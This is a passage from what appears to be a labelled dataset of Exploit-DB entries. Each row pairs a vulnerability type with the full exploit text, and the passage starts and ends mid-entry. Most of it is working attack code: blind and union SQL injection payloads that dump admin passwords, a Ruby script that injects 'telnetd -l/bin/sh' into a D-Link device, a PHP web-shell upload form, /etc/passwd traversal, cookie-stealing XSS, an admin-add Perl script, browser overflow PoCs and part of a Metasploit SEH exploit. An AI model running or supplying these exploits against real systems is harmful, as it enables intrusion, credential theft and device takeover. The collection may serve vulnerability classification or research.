($response->is_success) { 	if($response->content =~ /<span class=""display_header"">(.*)<\/span>/i) 	{ 		($username,$password) = split(/,/,$1); 		print ""Username: "".$username; 		print ""\nPassword: "".$password; 	} 	else 	{ 		print ""\nUnable to retrieve username/password.""; 	} } else {  die ""Error: "".$response->status_line; }  # milw0rm.com [2007-07-01]",SQL Injection,1
3618,"XOOPS Module Lykos Reviews 1.00 - 'index.php' SQL Injection <html> <head> <title>XOOPS Module Lykos Reviews 1.00 (index.php) BLIND SQL Injection Exploit</title>  <script type=""text/javascript"">  //'=============================================================================================== //'[Script Name: XOOPS Module Lykos Reviews 1.00 (index.php) BLIND SQL Injection Exploit //'[Coded by   : ajann //'[Author     : ajann //'[Contact    : :( //'[Dork       : inurl:/modules/lykos_reviews/ //'[S.Page     : http://www.lykoszine.co.uk //'[$$         : Free //'[Using      : Write Target after Submit Click //'===============================================================================================      function nesneyarat() {   var nesne;  var tarayici = navigator.appName;           if(tarayici == ""Microsoft Internet Explorer""){  nesne = new ActiveXObject(""Microsoft.XMLHTTP"");     }   else {  nesne = new XMLHttpRequest();    } return nesne; }   var http = nesneyarat();       function islemlink(adresyolla,charyolla) {  file=""/modules/lykos_reviews/index.php?op=u&uid=1"" pathim=document.getElementById('path').value + file karakterim=document.getElementById('karakter').value + charyolla adres=document.getElementById('adresim').value + pathim +  adresyolla + karakterim       http.open('get', adres);  http.onreadystatechange = cevapFonksiyonu;  http.send(null);      }       function cevapFonksiyonu() {  if(http.readyState == 4){ document.getElementById('mesaj').value = http.responseText; yonlendir();  } }    function yonlendir() {    if (document.getElementById('mesaj').value.indexOf('webmaster', 0) == -1) {  alert('False');     }   if (document.getElementById('mesaj').value.indexOf('webmaster', 0) != -1)  {    alert('TRUEEEEEEE');    }       }  function dal() {  if (document.getElementById('buton').value == ""Test Character(0)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=48)/*');    document.getElementById('buton').value = ""Test Character(1)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(1)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=49)/*');    document.getElementById('buton').value = ""Test Character(2)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(2)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=50)/*');    document.getElementById('buton').value = ""Test Character(3)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(3)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=51)/*');    document.getElementById('buton').value = ""Test Character(4)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(4)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=52)/*');    document.getElementById('buton').value = ""Test Character(5)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(5)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=53)/*');    document.getElementById('buton').value = ""Test Character(6)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(6)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=54)/*');    document.getElementById('buton').value = ""Test Character(7)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(7)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=55)/*');    document.getElementById('buton').value = ""Test Character(8)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(8)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=56)/*');    document.getElementById('buton').value = ""Test Character(9)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(9)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=57)/*');    document.getElementById('buton').value = ""Test Character(a)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(a)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=97)/*');    document.getElementById('buton').value = ""Test Character(b)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(b)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=98)/*');    document.getElementById('buton').value = ""Test Character(c)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(c)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=99)/*');    document.getElementById('buton').value = ""Test Character(d)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(d)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=100)/*');    document.getElementById('buton').value = ""Test Character(e)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(e)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=101)/*');    document.getElementById('buton').value = ""Test Character(f)""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }  if (document.getElementById('buton').value == ""Test Character(f)"") {    document.getElementById('buton').disabled = true; islemlink('/**/AND/**/(ascii(substring((SELECT/**/pass/**/FROM/**/xoops_users/**/WHERE/**/uid=1),',',1))=102)/*');    document.getElementById('buton').value = ""Finished""  setTimeout(""document.getElementById('buton').disabled = false;"",2000); return false;   }      }   </script>     </head>   <body bgcolor=""#000000"">  <center>  <p><b><font face=""Verdana"" size=""2"" color=""#008000"">XOOPS Module Lykos Reviews 1.00 (index.php) BLIND SQL Injection Exploit</font></b></p>  <p></p>     <b><font face=""Arial"" size=""1"" color=""#FF0000"">Target:</font><font face=""Arial"" size=""1"" color=""#808080"">[http://[target]/</font><font color=""#00FF00"" size=""2"" face=""Arial"">   </font><font color=""#FF0000"" size=""2"">&nbsp;</font></b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   <input type=""text"" name=""adresim"" size=""20"" style=""background-color: #808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';"" value=""http://""></p> <br>     <b><font face=""Arial"" size=""1"" color=""#FF0000"">&nbsp;Path:</font><font face=""Arial"" size=""1"" color=""#808080"">[http://[target]/[scriptpath]&nbsp;&nbsp;&nbsp; </font></b>   <input type=""text"" name=""path"" size=""20"" style=""background-color: #808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';"" value=""/"">   <p>     <b><font face=""Arial"" size=""1"" color=""#FF0000"">&nbsp;Character:</font><font face=""Arial"" size=""1"" color=""#808080"">[Md5    Character 1-32]&nbsp;&nbsp; </font></b>   <input type=""text"" name=""karakter"" size=""20"" style=""background-color: #808000"" onmouseover=""javascript:this.style.background='#808080';"" onmouseout=""javascript:this.style.background='#808000';"" value=""1""> </p>   <p><input type=""submit"" value=""Test Character(0)"" name=""buton"" onclick=""dal();""></p> <br> <textarea name=""mesaj"" rows=""1"" cols=""20"" style=""visibility:hidden"">&lt;/textarea&gt; <br> <p>  <b><font face=""Verdana"" size=""2"" color=""#008000"">ajann</font></b></p> </p> </center>    </body>  </html>  # milw0rm.com [2007-03-31]",SQL Injection,1
41515,"Responsive Events & Movie Ticket Booking Script - SQL Injection # # # # #  # Exploit Title: Responsive Events & Movie Ticket Booking Script - SQL Injection # Google Dork: N/A # Date: 06.03.2017 # Vendor Homepage: http://www.phpscriptsmall.com/ # Software : http://www.phpscriptsmall.com/product/responsive-events-movie-ticket-booking-script/ # Demo: http://theaterbookingscript.com/demo/advanced-ticketbooking/ # Version: N/A # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/news_desc.php?newsid=[SQL] # For example; # -7'+/*!50000union*/+select+1,0x496873616e2053656e63616e3c62723e7777772e696873616e2e6e6574,3,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),5,6-- - # users :user_id # users :email # users :user_name # users :password # users :mobile # users :country # users :state # -7'+/*!50000union*/+select+1,0x496873616e2053656e63616e3c62723e7777772e696873616e2e6e6574,3,/*!13337Concat*/(user_name,0x3a,password),5,6+from+users-- - # # # # #",SQL Injection,1
30261,"Moodle 1.7.1 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/24748/info  Moodle is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this vulnerability may allow an attacker to perform cross-site scripting attacks on unsuspecting users in the context of the affected website. As a result, the attacker may be able to steal cookie-based authentication credentials and to launch other attacks.  This issue affects Moodle 1.7.1; other versions may also be vulnerable.   http://www.example.com/user/index.php?contextid=4&roleid=0&id=2&group=&perpage=20&search=%22style=xss:expression(alert(document.cookie))%20",cross-site scripting,1
15645,"enano CMS 1.1.7pl1 - Multiple Vulnerabilities Vulnerability ID: HTB22709 Reference: http://www.htbridge.ch/advisory/sql_injection_in_enano_cms.html Product: Enano CMS Vendor: enanocms.org ( http://enanocms.org/ )  Vulnerable Version: 1.1.7pl1 Vendor Notification: 16 November 2010  Vulnerability Type: SQL Injection Status: Fixed by Vendor Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   SQL Injection: Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in email variable. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  The following PoC is available:  Step1. Register new user with email: ""any@email.com'SQL_CODE""  Step2. Log in with new login and password. Solution: Upgrade to the most recent version  Path Disclosure: Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in ""title"" variable, it's possible to generate an error that will reveal the full path of the script. A remote user can determine the full path to the web root directory and other potentially sensitive information.  The following PoC is available:   http://[host]/index.php?title=Special:Captcha/1 http://[host]/index.php?title[]=1  Solution: Upgrade to the most recent version",SQL Injection,1
45814,"CuteFTP 9.3.0.3 - Denial of Service (PoC) # Exploit Title: CuteFTP 9.3.0.3 - Denial of Service (PoC) # Date: 2018-11-05 # Exploit Author: Ismael Nava # Vendor Homepage: https://www.globalscape.com/cuteftp # Software Link: https://www.globalscape.com/cuteftp # Version: 9.3.0.3 # Tested on: Windows 10 Home x64 # CVE : n/a  # STEPS # Run the python exploit script, it will create a new .txt files # Open the program CuteFTP # Copy the content of the file ""Cute.txt"" # Paste the content in the fields Host, Username and Password # In the field ""Hostname or IP"" paste the content of the file ""IP.txt"" # Click in Connect # End :)  buffer = 'A' * 1000  try:      file = open(""Cute.txt"",""w"")     file.write(buffer)     file.close()      print(""Archive ready"") except:     print(""Archive no ready"")",Denial of Service,1
6761,"Hummingbird 13.0 - ActiveX Remote Buffer Overflow (PoC) <html>  <!--  the latest version of this activex (13.0) is compiled with /gs,  earlier versions aren't. The XXXX would have overwritten return address. by thomas.pollet@gmail.com  -->  <object classid='clsid:FFB6CC68-702D-4FE2-A8E7-4DE23835F0D2' id='target' ></object> <script language='vbscript'> arg1=""001101220123012401250126012701280129012:012;012<012=012>012?012@012A012B012C012D012E012FXXXX"" target.PlainTextPassword = arg1  </script> </html>   # milw0rm.com [2008-10-16]",Remote Buffer Overflow,1
40999,"My PHP Dating 2.0 - 'path' SQL Injection # # # # #  # Vulnerability: My Php Dating 2.0 - SQL Injection Web Vulnerability # Google Dork: My Php Dating # Date:09.01.2017 # Vendor Homepage: http://www.phponlinedatingsoftware.com/demo.htm # Script Name: My Php Dating # Script Version: 2.0 # Script Buy Now: http://www.phponlinedatingsoftware.com/order.htm # Author: Ihsan Sencan # Author Web: http://ihsan.net # Mail : ihsan[beygir]ihsan[nokta]net # # # # #  # SQL Injection/Exploit : # http://localhost/[PATH]/view_image.php?path=[SQL] # # # # #    -------------------------------------------------- Note:  Rate: 0/10 [Rate Picture] <<<Link -------------------------------------------------- http://localhost/[PATH]/view_image.php?path=-124 union select 1,version(),3,4,5,6,7,8,9 Version: javascript:%20ajax_rate_pic(5.5.52-cll,1,1) -------------------------------------------------- http://localhost/[PATH]/view_image.php?path=-124+union+select+1,group_concat(admin_id,admin_uname,admin_pass,admin_email),3,4,5,6,7,8,9+from+admin_master--  -------------------------------------------------- http://localhost/[PATH]/view_image.php?path=-124+union+select+1,group_concat(column_name),3,4,5,6,7,8,9+from+information_schema.columns+where+table_schema=database()--  -------------------------------------------------- http://localhost/[PATH]/view_image.php?path=-124+union+select+1,group_concat(table_name),3,4,5,6,7,8,9+from+information_schema.tables+where+table_schema=database()--",SQL Injection,1
47312,"WordPress Plugin GoURL.io < 1.4.14 - File Upload <html>     <!--          GoURL Unrestricted Upload Vulnerablity POC by @pouyadarabi               CWE-434          Vulnerable Fucntion: https://github.com/cryptoapi/Bitcoin-Wordpress-Plugin/blob/8aa17068d7ba31a05f66e0ab2bbb55efb0f60017/gourl.php#L5637                  Details:                    After checking file extention substring was used for file name to select first 95 letter line #5655           So enter file name like ""123456789a123456789b123456789c123456789d123456789e123456789f123456789g123456789h123456789i1.php.jpg""           will upload a file with .php extention in website :)      -->  <body>      <!--          Replace http://127.0.0.1/wp/ with target wordpress website         Fill id param in form action to any active download product      -->      <form action=""http://127.0.0.1/wp/?page=gourlfile&id=1"" method=""POST"" enctype=""multipart/form-data"">          <input type=""file"" name=""gourlimage2"" />         <input type=""submit""/>              </form>      <a href=""http://127.0.0.1/wp/wp-content/uploads/gourl/images/i123456789a123456789b123456789c123456789d123456789e123456789f123456789g123456789h123456789i1.php"">Shell link</a>  </body>  </html>",File Upload,1
37454,"D-Link DSP-W w110 v1.05b01 - Multiple Vulnerabilities # Exploit Title: D-Link DSP-W Arbitrary Arbitrary file upload # Date: 30/06/2015 # Exploit Author: DNO # Vendor Homepage: [link] # Version: w110 v1.05b01 # Tested on: linux # CVE :  N/A  ========================================  the only 'filtering' on this resources appears to be a sprintf() call which statically prefixes a submitted 'dev' argument with '/www'. However, if a HTTP request is performed without a 'dev' argument at all, the sprintf() call is never reached, and a fully-qualified path can be provided in the 'path' parameter - bypassing the upload path restriction.  *************** # Upload arbitrary files to the device. echo 'Some String' > test.txt curl \  -X POST \  -i \  -F name=@test.txt \  --http1.0 \  '192.168.1.3/web_cgi.cgi?&request=UploadFile&path=/etc/'   ========================================  # Exploit Title: D-Link DSP-W Diagnostic Information "" Get info"" # Date: 30/06/2015 # Exploit Author: DNO # Version: w110 v1.05b01 # Tested on: linux # CVE : N/A  ======================================== Severity Level: =============== High =============== Patches made to lighttpd by the vendor of this device allows an attacker to query the device, without authentication, for the following information:  # Current WLAN SSIDs # Current WLAN channels # LAN and WAN MAC addressing # Current firmware version information # Hardware version information  Although not sensitive information, it may allow for identification of devices running vulnerable firmware versions.  ========================================= # Information query. curl \ 192.168.1.3/mplist.txt  ======================================== #ruby poc ----  # DSP-W110-Lighttpd PoC.  require 'pp' require 'optparse' require 'restclient'  # Set defaults and parse command line arguments options = {}  options[:addr] = ""192.168.0.60"" options[:port] = 80  OptionParser.new do |option|  option.on(""--address [ADDRESS]"", ""Destination hostname or IP"") do |a| options[:addr] = a end  option.on(""--port [PORT]"", ""Destination TCP port"") do |p| options[:port] = p end  option.parse!  end  # Define which actions we will be using. actions = [ { :name => ""Get device information"", :call => ""txt_parser"", :path => ""mplist.txt"", }, { :name => ""Snatch configuration"", :call => ""noop"", :path => ""HNAP1"", :cookies => { :cookie => ""`cp /etc/co* /www/`"" } }, { :name => ""Fetch configuration"", :call => ""conf_writer"", :path => ""config.sqlite"", }, { :name => ""Enable telnet (root)"", :call => ""noop"", :path => ""HNAP1"", :cookies => { :cookie => ""`telnetd -l/bin/sh`"" } } ]  def noop(val) return end  def txt_parser(txt) txt.split(/\r?\n/).each do |line| puts "" #{line}"" end end  def conf_writer(txt) begin f = File.open('./config.sqlite', 'wb') rescue => e puts ""[!] Failed to open config.sqlite for writing #{e.message}"" end f.write(txt) f.close puts ""[*] Configuration fetched into 'config.sqlite'"" end  # Iterate over all actions and attempt to execute. url = ""http://#{options[:addr]}:#{options[:port]}""  puts ""[!] Attempting to extract information from #{url}""  actions.each do |action|  # Fire the request and ensure a 200 OKAY. begin response = RestClient.get( ""#{url}/#{action[:path]}"", {:cookies => action[:cookies]} ) rescue puts ""[!] Failed to query remote host."" abort end  if response.code != 200 puts ""[-] '#{action[:name]}' failed with response: #{response.code}"" next end  # Send to the processor. puts ""[*] #{action[:name]} request succeeded."" send(action[:call], response.body())  end ===================================   contact me FB : FB.COM/haker.dyno  Copyright © 2015 /DNO/",Arbitrary Arbitrary file upload,1
6546,"Rianxosencabos CMS 0.9 - Remote Add Admin #!/usr/bin/perl -w  # Rianxosencabos CMS 0.9 Remote Add Admin Exploit # Download: http://downloads.sourceforge.net/rsccms/rsccms.tar.gz  # written by ka0x <ka0x01 [at] gmail [dot] com> # D.O.M Labs - Security Researchers # - www.domlabs.org -  use LWP::UserAgent;  my ($host, $login, $pass, $mail, $user_id) = @ARGV ;  unless($ARGV[4]){ 	print ""[*] usage: perl $0 <host> <login> <pass> <mail> <user_id>\n""; 	print ""[*] ex: perl $0 http://localhost/ ka0x 12345 ka0x01[at]gmail.com 2\n""; 	exit 1; }  if ($host !~ /^http:/){ $host = 'http://'.$host; }  my $ua = LWP::UserAgent->new() or die ; $ua->agent(""Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1"") ; $ua->timeout(10) ;  sub __CREATE {  	my $req = HTTP::Request->new(POST => $host.""index.php?s=usuarios&accion=registrar"") ; 	$req->content_type('application/x-www-form-urlencoded') ; 	$req->content(""reg_login="".$login.""&reg_pass="".$pass.""&reg_repass="".$pass.""&reg_nombre="".$login.""&reg_mail="".$mail.""&submit_register=Rexistrar"") ;  	my $res = $ua->request($req) ; 	my $location = $res->header('Location') ; 	if ($location =~ /Usuario creado/i) { 		print ""[+] user added: "".$login ; 		print ""\n[+] password: "".$pass, ""\n"" ; 	}  	else{ 		print ""[-] Exploit Failed!\n"" ; 	} }  &__CREATE ;  sub __ADMIN { 	my $req = HTTP::Request->new(POST => $host.""?s=admin&accion=lista"") ;  	$req->content_type('application/x-www-form-urlencoded') ;  	$req->content($user_id.""=0&inputOculto="".$user_id) ;  	$ua->request($req) ; }  &__ADMIN ;   __END__  # milw0rm.com [2008-09-24]",Remote Add Admin,1
30203,"Comersus Cart 7.0.7 - 'comersus_optReviewReadExec.asp?id' SQL Injection source: https://www.securityfocus.com/bid/24562/info  Comersus Cart is affected by multiple input validation vulnerabilities.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  The attacker may also leverage this issue to execute arbitrary code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Comersus Cart 7.0.7 is vulnerable; other versions may also be affected.   http://www.example.com/store/comersus_optReviewReadExec.asp?idProduct='",SQL Injection,1
40605,"Microsoft Edge - Spread Operator Stack Overflow (MS16-119) <!-- Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=910  The spread operator in JavaScript allows an array to be treated as function parameters using the following syntax:  var a = [1,2];  f(...a);  This is implemented in the JavascriptFunction::SpreadArgs function in Chakra (https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/JavascriptFunction.cpp).   On line 1054 of this function, the following code is used to spread an array:                          if (argsIndex + arr->GetLength() > destArgs.Info.Count)                         {                             AssertMsg(false, ""The array length has changed since we allocated the destArgs buffer?"");                             Throw::FatalInternalError();                         }                          for (uint32 j = 0; j < arr->GetLength(); j++)                         {                             Var element;                             if (!arr->DirectGetItemAtFull(j, &element))                             {                                 element = undefined;                             }                             destArgs.Values[argsIndex++] = element;                         }   When DirectGetItemAtFull accesses the array, if an element of the array is undefined, it will fall back to the prototype of the array. In some situations, for example if the prototype is a Proxy, this can execute user-defined script, which can change the length of the array, meaning that the call can overflow destArgs.Values, even through the length has already been checked. Note that this check also has a potential integer overflow, which should also probably be fixed as a part of this issue.  A full PoC is attached. -->  <html> <script> var y = 0; var t = [1,2,3]; var t2 = [4,4,4]; var mp = new Proxy(t2, {   get: function (oTarget, sKey) {     var a = [1,2];     a.reverse();     alert(""get "" + sKey.toString());     alert(oTarget.toString());     y = y + 1;     if(y == 2){         var temp = [];         oTarget.__proto__ = temp.__proto__; 	t.length = 10000;         temp.fill.call(t, 7, 0, 1000);         return 5;     }     return oTarget[sKey] || oTarget.getItem(sKey) || undefined;   },   set: function (oTarget, sKey, vValue) {     alert(""set "" + sKey);     if (sKey in oTarget) { return false; }     return oTarget.setItem(sKey, vValue);   },   deleteProperty: function (oTarget, sKey) {     alert(""delete"");     if (sKey in oTarget) { return false; }     return oTarget.removeItem(sKey);   },   enumerate: function (oTarget, sKey) {     alert(""enum"");     return oTarget.keys();   },   ownKeys: function (oTarget, sKey) {     alert(""ok"");     return oTarget.keys();   },   has: function (oTarget, sKey) {     alert(""has"" + sKey);     return true;   },   defineProperty: function (oTarget, sKey, oDesc) {     alert(""dp"");     if (oDesc && ""value"" in oDesc) { oTarget.setItem(sKey, oDesc.value); }     return oTarget;   },   getOwnPropertyDescriptor: function (oTarget, sKey) {     alert(""fopd"");     var vValue = oTarget.getItem(sKey);     return vValue ? {       value: vValue,       writable: true,       enumerable: true,       configurable: false     } : undefined;   }, });  function f(a){  	alert(a); }  var q = f;  t.length = 4; var o = {};   Object.defineProperty(o, '3', {     get: function() {       alert('get!');       return temperature;     }   });  t.__proto__ = mp; //t.__proto__.__proto__ = o;  q(...t);  </script> </html>",Spread Operator Stack Overflow,1
46187,Oracle Reports Developer Component 12.2.1.3 - Cross-site Scripting # Exploit Title: [Cross-site Scripting (XSS)] # Date: [2019-01-15] # Exploit Author: [Mohamed M.Fouad - From SecureMisr Company] # Vendor Homepage: [https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html] # Version: [12.2.1.3] (REQUIRED) # Tested on: [Windows 10] # CVE : [CVE-2019-2413]  POC:  https://<ip>/reports/rwservlet/showenv%22%3E%3Cimg%20src=x%20onerror=prompt(1);%3E,Cross-site Scripting,1
5828,"Oxygen 2.0 - 'repquote' SQL Injection ###################### # #Oxygen 2.0 SQL Injection Vulnerability # ###################### # #Bug by: h0yt3r # ## ### ## # #This Board Software suffers from a not correctly verified quote ID variable which is used in SQL Querys. #An Attacker can easily get sensitive information from the database by #injecting unexpected SQL Querys. #We need a valid topic ID. #Im not bored enough to code an exploit for this, so do it manually. #Its by the way easy to find the correct prefix for the tables by producing a SQL Error. #When injected your Query you can find the output in the Subject Text Box. # #SQL Injection: #http://[target]/[path]/post.php?action=reply&tid=2517&repquote=[Sequel] # #PoC: #post.php?action=reply&tid=2517&repquote=-1'%20union%20select%20concat(username,0x3a,password),2,3,4,5,6%20from%20o2_members--+ # ####################### # #Greetz to b!zZ!t, ramon, thund3r, Free-Hack, Sys-Flaw and of course the (...) h4ck-y0u Team! # ####################### #######################   # milw0rm.com [2008-06-15]",SQL Injection,1
15151,"Webspell 4.2.1 - 'asearch.php' SQL Injection ################# INFORMATION ################################################## +Name : webspell 4.2.1 asearch.php SQL Injection Vulnerability +Author : silent vapor +Date   : 29.09.2010 +Script  : webspell 4.2.1 +Price : free +Language :PHP +Discovered by silent vapor +Underground Agents +Greetz to Team-Internet, 4004-Security-Project, Easy Laster ################################################################################  +Vulnerability : http://localhost/webspell/asearch.php?site=search&table=user& column=nickname&exact=true&identifier=userID&searchtemp=search_user&search=  +Exploitable   : http://localhost/webspell/asearch.php?site=search&table=user& column=nickname&exact=true&identifier=userID&searchtemp=search_user&search= admin%2527%20UNION+/**/+SELECT%201,1,1,1,1,password,1,1,1,1,1,1,1,1,1,1,1,1,1,1, 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1%20FROM %20ws_2lu_user%20WHERE%20%25271%2527=%25271  ################################################################################",SQL Injection,1
28315,Help Center Live 2.1.2 - 'module.php' Directory Traversal source: https://www.securityfocus.com/bid/19256/info  Help Center Live is prone to a directory-traversal vulnerability because it fails to properly sanitize user-supplied input.   An attacker can exploit this issue to retrieve arbitrary files from the vulnerable system in the context of the affected application. Information obtained may aid attackers in further attacks.  This issue affects version 2.1.2; other versions may also be vulnerable.  http://www.example.com/module.php?module=osTicket&file=../../../../../../../../../etc/passwd,Directory Traversal,1
17039,"HP OpenView Network Node Manager (OV NNM) - 'snmpviewer.exe' Remote Buffer Overflow (Metasploit) ## # $Id: hp_nnm_snmpviewer_actapp.rb 12098 2011-03-23 15:47:20Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/snmpviewer.exe', :pattern => /Hewlett-Packard Development Company/ }  	include Msf::Exploit::Remote::HttpClient 	include Msf::Exploit::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'HP OpenView Network Node Manager snmpviewer.exe Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in HP OpenView Network Node Manager 7.53 				prior to NNM_01203. By making a specially crafted HTTP request to the ""snmpviewer.exe"" 				CGI program, an attacker can cause a stack-based buffer overflow and execute arbitrary 				code.  				The vulnerable code lies within the a function within ""snmpviewer.exe"" with a 				timestamp prior to April 7th, 2010. This vulnerability is triggerable via either a GET 				or POST request. The request must contain 'act' and 'app' parameters which, when 				combined, total more than the 1024 byte stack buffer can hold.  				It is important to note that this vulnerability must be exploited by overwriting SEH. 				While the saved return address can be smashed, a function call that occurs before 				the function returns calls ""exit"". 			} , 			'Author'         => 				[ 					'jduck'   # Metasploit module 				], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 12098 $', 			'References'     => 				[ 					[ 'CVE', '2010-1552' ], 					[ 'OSVDB', '64975' ], 					[ 'BID', '40068' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-083/' ], 					[ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02153379' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Privileged'     => false, 			'Payload'        => 				{ 					'Space'    => 1024, # 1024 byte buffer.. 					'BadChars' => 						# Not sure why this one has a different set of bad chars... 						( 							(0x00..0x08).to_a + (0x0b..0x1f).to_a + 							[ 0x21, 0x26, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f ] 						).pack('C*'), 					'DisableNops' => true, 					# Manually use FPU to get EIP into ECX 					'PrependEncoder' => ""\x89\xe2\xdb\xdb\xd9\x72\xf4\x59\x83\xe9\xf7"", 					'EncoderOptions' => { 'BufferRegister' => 'ecx' }, 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'HP OpenView Network Node Manager 7.53 w/NNM_01201', 						{ 							'Ret'     => 0x5a238ba7, # pop edx/pop ebp/ret - in ovsnmp.dll v1.30.10.9166 						} 					], 					[ 'HP OpenView Network Node Manager 7.53 (Windows 2003)', 						{ 							'Ret'     => 0x71c069dd, # pop edx/pop ecx/ret - in ws2_32.dll v5.2.3790.3959 						} 					], 					[ 'Debug Target', 						{ 							'Ret'     => 0xdeadbeef, # crasher 						} 					] 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'May 11 2010'))  		register_options( 			[ 				Opt::RPORT(80), 			], self.class) 	end  	def exploit  		print_status(""Trying target #{target.name}..."")  		cgi = '/OvCgi/snmpviewer.exe'  		# 